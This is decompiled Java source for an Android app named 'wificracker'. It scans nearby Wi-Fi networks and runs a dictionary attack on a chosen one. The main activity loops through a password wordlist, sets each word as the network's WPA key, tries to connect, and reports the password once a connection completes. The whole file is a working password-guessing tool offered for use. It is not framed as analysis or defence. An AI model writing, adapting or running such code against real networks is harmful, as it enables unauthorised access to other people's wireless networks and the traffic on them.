/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.SharedPreferences
 *  android.content.res.AssetManager
 *  android.graphics.Color
 *  android.graphics.drawable.ColorDrawable
 *  android.graphics.drawable.Drawable
 *  android.net.ConnectivityManager
 *  android.net.wifi.ScanResult
 *  android.net.wifi.SupplicantState
 *  android.net.wifi.WifiConfiguration
 *  android.net.wifi.WifiInfo
 *  android.net.wifi.WifiManager
 *  android.os.Bundle
 *  android.os.Parcelable
 *  android.os.Process
 *  android.os.SystemClock
 *  android.preference.PreferenceManager
 *  android.support.v7.app.AlertDialog
 *  android.support.v7.app.AlertDialog$Builder
 *  android.support.v7.app.AppCompatActivity
 *  android.view.View
 *  android.view.View$OnClickListener
 *  android.widget.AdapterView
 *  android.widget.AdapterView$OnItemClickListener
 *  android.widget.ArrayAdapter
 *  android.widget.Button
 *  android.widget.ListAdapter
 *  android.widget.ListView
 *  android.widget.TextView
 *  java.io.BufferedReader
 *  java.io.File
 *  java.io.FileInputStream
 *  java.io.FileNotFoundException
 *  java.io.IOException
 *  java.io.InputStream
 *  java.io.InputStreamReader
 *  java.io.Reader
 *  java.lang.CharSequence
 *  java.lang.Class
 *  java.lang.Exception
 *  java.lang.Object
 *  java.lang.Runnable
 *  java.lang.String
 *  java.lang.StringBuilder
 *  java.lang.Thread
 *  java.util.ArrayList
 *  java.util.BitSet
 *  java.util.Calendar
 *  java.util.Date
 *  java.util.List
 */
package com.themrbigfoot.wificracker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.wifi.ScanResult;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Parcelable;
import android.os.Process;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.TextView;
import com.themrbigfoot.wificracker.SettingsClass;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.util.ArrayList;
import java.util.BitSet;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class MainActivity
extends AppCompatActivity {
    private ArrayAdapter adapter;
    private ArrayList<String> arrayList = new ArrayList();
    AssetManager assetManager;
    int attempts;
    BufferedReader bufferedReader = null;
    AlertDialog.Builder builder;
    private Button buttonScan;
    ConnectivityManager connectivityManager = null;
    String contactUs = "contact_us";
    int crackerRate = 6000;
    String featureRequest = "feature_request";
    File file;
    String filePathKey = "filePath";
    String helpWebsite = "helpWebsite";
    boolean iscracked = false;
    String line;
    private ListView listView;
    TextView log;
    SharedPreferences preferences;
    String pwd = null;
    private List<ScanResult> results;
    boolean runScan = false;
    boolean supStateAss = false;
    boolean supStateComp = false;
    int tracker;
    String useDefaultFile = "use_default_wordlist";
    String use_hex = "password_hex";
    String use_notification = "use_notification";
    WifiConfiguration wifiConfiguration;
    private WifiManager wifiManager;
    BroadcastReceiver wifiReceiver = new BroadcastReceiver(){

        public void onReceive(Context context, Intent intent) {
            String string2 = intent.getAction();
            if ("android.net.wifi.SCAN_RESULTS".equals((Object)string2)) {
                MainActivity mainActivity = MainActivity.this;
                mainActivity.results = mainActivity.wifiManager.getScanResults();
                for (ScanResult scanResult : MainActivity.this.results) {
                    ArrayList arrayList = MainActivity.this.arrayList;
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append(scanResult.SSID);
                    stringBuilder.append(" - ");
                    stringBuilder.append(scanResult.capabilities);
                    arrayList.add((Object)stringBuilder.toString());
                    MainActivity.this.adapter.notifyDataSetChanged();
                }
                TextView textView = MainActivity.this.log;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("Scan complete. Found ");
                stringBuilder.append(MainActivity.this.arrayList.size());
                stringBuilder.append(" Networks.");
                textView.setText((CharSequence)stringBuilder.toString());
                return;
            }
            if ("android.net.wifi.supplicant.STATE_CHANGE".equals((Object)string2)) {
                SupplicantState supplicantState = (SupplicantState)intent.getParcelableExtra("newState");
                if (SupplicantState.isValidState((SupplicantState)supplicantState) && supplicantState == SupplicantState.ASSOCIATING) {
                    MainActivity.this.supStateAss = true;
                } else if ((!SupplicantState.isValidState((SupplicantState)supplicantState) || supplicantState != SupplicantState.ASSOCIATED) && SupplicantState.isValidState((SupplicantState)supplicantState) && supplicantState == SupplicantState.COMPLETED) {
                    MainActivity.this.onCracked();
                    MainActivity.this.supStateComp = true;
                }
                return;
            }
            "android.intent.action.GET_CONTENT".equals((Object)string2);
        }
    };

    private void onCracked() {
        TextView textView = this.log;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("Password for network is: ");
        stringBuilder.append(this.pwd);
        stringBuilder.append("\nFound in ");
        stringBuilder.append(this.attempts);
        stringBuilder.append(" attemptsfor network: ");
        stringBuilder.append(((ScanResult)this.results.get((int)this.tracker)).SSID);
        textView.setText((CharSequence)stringBuilder.toString());
        this.unregisterReceiver(this.wifiReceiver);
    }

    private void scanWifi() {
        this.iscracked = false;
        this.arrayList.clear();
        this.registerReceiver(this.wifiReceiver, new IntentFilter("android.net.wifi.SCAN_RESULTS"));
        this.registerReceiver(this.wifiReceiver, new IntentFilter("android.net.wifi.supplicant.STATE_CHANGE"));
        this.registerReceiver(this.wifiReceiver, new IntentFilter("android.intent.action.GET_CONTENT"));
        this.wifiManager.startScan();
        this.log.setText((CharSequence)"Scanning Wifi...");
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.setContentView(2131427356);
        this.wifiManager = (WifiManager)this.getApplicationContext().getSystemService("wifi");
        this.wifiManager.disconnect();
        this.connectivityManager = (ConnectivityManager)this.getSystemService("connectivity");
        this.buttonScan = (Button)this.findViewById(2131230755);
        this.log = (TextView)this.findViewById(2131230897);
        ((Button)this.findViewById(2131230756)).setOnClickListener(new View.OnClickListener(){

            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this.getBaseContext(), SettingsClass.class);
                MainActivity.this.startActivity(intent);
            }
        });
        this.buttonScan.setOnClickListener(new View.OnClickListener(){

            public void onClick(View view) {
                MainActivity.this.scanWifi();
            }
        });
        this.listView = (ListView)this.findViewById(2131230816);
        this.listView.setDivider((Drawable)new ColorDrawable(Color.parseColor((String)"#53354A")));
        this.preferences = PreferenceManager.getDefaultSharedPreferences((Context)this);
        if (!this.wifiManager.isWifiEnabled()) {
            this.log.setText((CharSequence)"Wifi disabled...Enabling wifi now.");
            this.wifiManager.setWifiEnabled(true);
        }
        this.adapter = new ArrayAdapter((Context)this, 17367043, this.arrayList);
        this.listView.setAdapter((ListAdapter)this.adapter);
        this.builder = new AlertDialog.Builder((Context)this);
        this.listView.setOnItemClickListener(new AdapterView.OnItemClickListener(){

            public void onItemClick(AdapterView<?> adapterView, View view, int n, long l) {
                MainActivity mainActivity = MainActivity.this;
                mainActivity.tracker = n;
                AlertDialog.Builder builder = mainActivity.builder;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("Dictionary Attack: ");
                stringBuilder.append(((ScanResult)MainActivity.access$100((MainActivity)MainActivity.this).get((int)n)).SSID);
                builder.setTitle((CharSequence)stringBuilder.toString());
                AlertDialog.Builder builder2 = MainActivity.this.builder;
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2.append("Please review before starting dictionary attack.\nFile being used: \nStart Time: ");
                stringBuilder2.append((Object)Calendar.getInstance().getTime());
                builder2.setMessage((CharSequence)stringBuilder2.toString());
                MainActivity.this.builder.setCancelable(true);
                MainActivity.this.builder.setPositiveButton((CharSequence)"Start", new DialogInterface.OnClickListener(){

                    public void onClick(DialogInterface dialogInterface, int n) {
                        MainActivity.this.runScan = true;
                        MainActivity.this.preferences = MainActivity.this.getPreferences(0);
                        String string2 = MainActivity.this.preferences.getString(MainActivity.this.filePathKey, "");
                        if (string2 == "") {
                            MainActivity.this.assetManager = MainActivity.this.getAssets();
                            MainActivity.this.log.setText((CharSequence)"Loading default wordlist.");
                            try {
                                MainActivity.this.bufferedReader = new BufferedReader((Reader)new InputStreamReader(MainActivity.this.getAssets().open("wordlist.txt")));
                            }
                            catch (Exception exception) {
                                TextView textView = MainActivity.this.log;
                                StringBuilder stringBuilder = new StringBuilder();
                                stringBuilder.append("Unabled to load user defined file. Error: ");
                                stringBuilder.append(exception.getMessage());
                                textView.setText((CharSequence)stringBuilder.toString());
                            }
                        } else {
                            try {
                                MainActivity.this.bufferedReader = new BufferedReader((Reader)new InputStreamReader((InputStream)MainActivity.this.openFileInput(string2)));
                            }
                            catch (FileNotFoundException fileNotFoundException) {
                                MainActivity.this.log.setText((CharSequence)"User file has been moved/deleted. Loading default wordlist.");
                                try {
                                    MainActivity.this.bufferedReader = new BufferedReader((Reader)new InputStreamReader(MainActivity.this.getAssets().open("wordlist.txt")));
                                }
                                catch (IOException iOException) {
                                    TextView textView = MainActivity.this.log;
                                    StringBuilder stringBuilder = new StringBuilder();
                                    stringBuilder.append("Error loading file: ");
                                    stringBuilder.append(iOException.getMessage());
                                    textView.setText((CharSequence)stringBuilder.toString());
                                }
                            }
                        }
                        WifiConfiguration wifiConfiguration = MainActivity.this.wifiConfiguration = new WifiConfiguration();
                        Object[] arrobject = new Object[]{((ScanResult)MainActivity.access$100((MainActivity)MainActivity.this).get((int)MainActivity.this.tracker)).SSID};
                        wifiConfiguration.SSID = String.format((String)"\"%s\"", (Object[])arrobject);
                        MainActivity.this.wifiConfiguration.allowedProtocols.set(1);
                        MainActivity.this.wifiConfiguration.allowedProtocols.set(0);
                        MainActivity.this.wifiConfiguration.allowedKeyManagement.set(1);
                        MainActivity.this.wifiConfiguration.allowedPairwiseCiphers.set(2);
                        MainActivity.this.wifiConfiguration.allowedPairwiseCiphers.set(1);
                        MainActivity.this.wifiConfiguration.allowedGroupCiphers.set(0);
                        MainActivity.this.wifiConfiguration.allowedGroupCiphers.set(1);
                        MainActivity.this.wifiConfiguration.allowedGroupCiphers.set(3);
                        MainActivity.this.wifiConfiguration.allowedGroupCiphers.set(2);
                        MainActivity.this.wifiManager.disconnect();
                        MainActivity.this.log.setText((CharSequence)"Prepared for WHILE loop");
                        new Thread(new Runnable(){

                            /*
                             * Enabled aggressive block sorting
                             * Enabled unnecessary exception pruning
                             * Enabled aggressive exception aggregation
                             */
                            public void run() {
                                Process.setThreadPriority((int)10);
                                MainActivity.this.log.setText((CharSequence)"Started dictionary attack");
                                MainActivity.this.attempts = 0;
                                try {
                                    MainActivity.this.line = MainActivity.this.bufferedReader.readLine();
                                    while (MainActivity.this.line != null && MainActivity.this.runScan) {
                                        WifiConfiguration wifiConfiguration = MainActivity.this.wifiConfiguration;
                                        Object[] arrobject = new Object[]{MainActivity.this.line};
                                        wifiConfiguration.preSharedKey = String.format((String)"\"%s\"", (Object[])arrobject);
                                        int n = MainActivity.this.wifiManager.addNetwork(MainActivity.this.wifiConfiguration);
                                        TextView textView = MainActivity.this.log;
                                        StringBuilder stringBuilder = new StringBuilder();
                                        stringBuilder.append("netid: ");
                                        stringBuilder.append(n);
                                        stringBuilder.append(" SUPP: ");
                                        stringBuilder.append((Object)MainActivity.this.wifiManager.getConnectionInfo().getSupplicantState());
                                        stringBuilder.append(" /  Password: ");
                                        stringBuilder.append(MainActivity.this.line);
                                        textView.setText((CharSequence)stringBuilder.toString());
                                        if (n != -1) {
                                            SystemClock.sleep((long)MainActivity.this.crackerRate);
                                            MainActivity.this.wifiManager.enableNetwork(n, true);
                                            MainActivity.this.wifiManager.reconnect();
                                            MainActivity.this.pwd = MainActivity.this.line;
                                            if (MainActivity.this.supStateComp) {
                                                MainActivity.this.wifiManager.saveConfiguration();
                                                MainActivity.this.iscracked = true;
                                                MainActivity.this.runScan = false;
                                                return;
                                            }
                                        }
                                        MainActivity mainActivity = MainActivity.this;
                                        mainActivity.attempts = 1 + mainActivity.attempts;
                                        MainActivity.this.line = MainActivity.this.bufferedReader.readLine();
                                    }
                                    return;
                                }
                                catch (IOException iOException) {
                                    TextView textView = MainActivity.this.log;
                                    StringBuilder stringBuilder = new StringBuilder();
                                    stringBuilder.append("While loop IOException: ");
                                    stringBuilder.append(iOException.getMessage());
                                    textView.setText((CharSequence)stringBuilder.toString());
                                    return;
                                }
                            }
                        }).start();
                    }

                });
                MainActivity.this.builder.setNegativeButton((CharSequence)"Cancel", new DialogInterface.OnClickListener(){

                    public void onClick(DialogInterface dialogInterface, int n) {
                        dialogInterface.cancel();
                    }
                });
                MainActivity.this.builder.create().show();
            }

        });
    }

    public void onDestroy() {
        super.onDestroy();
        BroadcastReceiver broadcastReceiver = this.wifiReceiver;
        if (broadcastReceiver != null) {
            this.unregisterReceiver(broadcastReceiver);
        }
    }

    public void onPause() {
        super.onPause();
    }

    public void onResume() {
        super.onResume();
    }

}

